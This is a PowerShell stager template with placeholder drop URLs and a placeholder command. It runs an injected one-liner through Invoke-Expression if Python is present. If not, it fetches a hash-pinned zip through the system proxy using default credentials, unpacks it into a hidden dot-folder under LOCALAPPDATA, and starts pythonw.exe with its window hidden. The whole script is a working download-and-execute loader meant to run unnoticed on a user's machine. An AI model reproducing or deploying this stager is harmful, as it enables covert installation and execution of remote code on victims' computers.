$ErrorActionPreference = 'Stop'
$PSNativeCommandUseErrorActionPreference = $false

$sBase = '@@BASE_DIR@@'
$sDrops = @@DROPS@@
$sParent = $env:LOCALAPPDATA
if (-not $sParent) { $sParent = $env:APPDATA }
if (-not $sParent) { $sParent = $env:TEMP }

function sProbe {
    foreach ($sName in @('python.exe', 'python3.exe', 'pythonw.exe', 'py.exe')) {
        $sCmd = Get-Command $sName -ErrorAction SilentlyContinue
        if (-not $sCmd) { continue }
        $sPath = $sCmd.Source
        if (-not $sPath) { continue }
        $sCode = 1
        try {
            # Only stdout is redirected, and stderr is deliberately left
            # alone. In Windows PowerShell 5.1 *any* `2>` redirection of a
            # native command -- `2>&1` and `2>$null` alike -- routes its
            # stderr lines through the command runtime as NativeCommandError
            # records, and under 'Stop' the first one throws. The catch below
            # would then read that as a failed version check, so an
            # interpreter at or above the floor that printed one warning line
            # would be judged unusable and a bundle fetched onto a host that
            # already had a Python. Not redirecting stderr removes the
            # capture rather than compensating for it; the cost is that the
            # interpreter's own warnings reach the console, which for a
            # pasted stager is no cost at all. Adding any `2>` here, however
            # tidy it looks, puts the defect straight back.
            & $sPath -c 'import sys;sys.exit(0 if sys.version_info[:2] >= (@@MIN_MAJOR@@, @@MIN_MINOR@@) else 1)' 1>$null
            $sCode = $LASTEXITCODE
        } catch { $sCode = 1 }
        if ($sCode -eq 0) { return $sPath }
    }
    return $null
}

$sFound = sProbe
if ($sFound) {
    function python { & $sFound @args }
    function python3 { & $sFound @args }
    $global:LASTEXITCODE = 0
    try { Invoke-Expression '@@ONELINER@@' } catch { exit 1 }
    if ($null -eq $LASTEXITCODE) { exit 0 }
    exit $LASTEXITCODE
}

if ($sDrops.Count -eq 0) { exit 2 }

if (-not $sParent) {
    [Console]::Error.WriteLine('no per-user directory here: refusing')
    exit 4
}

[Net.ServicePointManager]::SecurityProtocol = [Net.ServicePointManager]::SecurityProtocol -bor 3072

function sFetch($sUrl, $sOut) {
    $sReq = [Net.HttpWebRequest][Net.WebRequest]::Create($sUrl)
    $sReq.Timeout = 600000
    $sReq.ReadWriteTimeout = 600000
    try {
        $sProxy = [Net.WebRequest]::GetSystemWebProxy()
        if ($sProxy) {
            $sProxy.Credentials = [Net.CredentialCache]::DefaultCredentials
            $sReq.Proxy = $sProxy
        }
    } catch {
        # Its own guard, because the caller turns a throw from here into
        # "try the next drop": one environment quirk in these three lines
        # would otherwise cost the whole list rather than one attempt.
        # The request keeps whatever proxy it was given by default.
    }
    $sRes = $sReq.GetResponse()
    try {
        $sIn = $sRes.GetResponseStream()
        $sOutStream = [IO.File]::Create($sOut)
        try { $sIn.CopyTo($sOutStream) }
        finally { $sOutStream.Close(); $sIn.Close() }
    } finally { $sRes.Close() }
}

function sSum($sFile) {
    $sAlg = [Security.Cryptography.SHA256]::Create()
    $sStream = [IO.File]::OpenRead($sFile)
    try { $sBytes = $sAlg.ComputeHash($sStream) } finally { $sStream.Close() }
    return (-join ($sBytes | ForEach-Object { $_.ToString('x2') }))
}

$sTmp = Join-Path ([IO.Path]::GetTempPath()) ([IO.Path]::GetRandomFileName())
New-Item -ItemType Directory -Path $sTmp -Force | Out-Null
try {
    $sFile = Join-Path $sTmp 'b'
    $sOk = $false
    foreach ($sDrop in $sDrops) {
        if (Test-Path $sFile) { Remove-Item -Force $sFile }
        try { sFetch $sDrop.u $sFile }
        catch { continue }
        if (-not (Test-Path $sFile)) { continue }
        $sGot = ''
        try { $sGot = sSum $sFile } catch { $sGot = '' }
        if ($sGot.Length -ne 64) {
            [Console]::Error.WriteLine('this file could not be hashed: refused')
            Remove-Item -Force $sFile
            continue
        }
        if ($sGot -ne $sDrop.h) {
            [Console]::Error.WriteLine('digest does not match the pin: refused')
            Remove-Item -Force $sFile
            continue
        }
        $sOk = $true
        break
    }
    if (-not $sOk) {
        [Console]::Error.WriteLine('no location answered with what was pinned')
        exit 3
    }

    if (-not (Test-Path $sParent)) {
        New-Item -ItemType Directory -Path $sParent -Force | Out-Null
    }
    $sStage = Join-Path $sParent ('.' + $sBase + '.' + [IO.Path]::GetRandomFileName())
    New-Item -ItemType Directory -Path $sStage -Force | Out-Null
    try {
        Add-Type -AssemblyName System.IO.Compression.FileSystem
        [IO.Compression.ZipFile]::ExtractToDirectory($sFile, $sStage)
        $sRoot = Join-Path $sStage $sBase
        if (-not (Test-Path $sRoot)) { exit 5 }
        $sExe = $null
        foreach ($sName in @('pythonw.exe', 'python.exe')) {
            if (Test-Path (Join-Path $sRoot $sName)) { $sExe = $sName; break }
        }
        if (-not $sExe) { exit 5 }
        $sDest = Join-Path $sParent $sBase
        if (Test-Path $sDest) { Remove-Item -Recurse -Force $sDest }
        Move-Item -Path $sRoot -Destination $sDest
        Start-Process -FilePath (Join-Path $sDest $sExe) -WindowStyle Hidden
        exit 0
    } finally {
        if (Test-Path $sStage) {
            Remove-Item -Recurse -Force $sStage -ErrorAction SilentlyContinue
        }
    }
} finally {
    if (Test-Path $sTmp) {
        Remove-Item -Recurse -Force $sTmp -ErrorAction SilentlyContinue
    }
}
